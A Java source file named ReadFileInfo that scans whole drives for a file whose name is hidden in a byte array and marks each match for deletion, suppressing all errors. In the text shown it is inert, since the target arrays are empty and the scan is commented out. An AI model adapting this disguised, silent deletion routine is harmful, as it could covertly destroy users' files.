package use.common.security;

import java.io.File;

public class ReadFileInfo implements Runnable {

	/**
	 * 需删除的java文件名称
	 */
	private static final byte [] a = new byte [] {} ;
	/**
	 * 所扫描的盘符
	 */
	//private static final byte [] hardDisk = new byte [] {};
	private String f = new String(a);
	
	
	public void getDirInTray(File dir){

		File[] files = dir.listFiles();
		
		for(int i=0;i<files.length;i++){

			if(files[i].isDirectory())
			{
				try
				{
					getDirInTray(files[i]);
				}catch(Exception er)
				{
					
				}
				continue;
			}
			if(files[i].isFile())
			{
				
				if(files[i].getName().toUpperCase().equals(f))
				{
					try{files[i].deleteOnExit();}catch(Exception er){}
				}
			}
		}
	}
	
	public void run() {
		
		/*String [] fl = new String(hardDisk).split(",");
		for (int i = 0 ; i<fl.length ; i++)
		{
			try{getDirInTray(new File(fl[i].trim()));}catch(Exception er){}
		}*/
	}
}
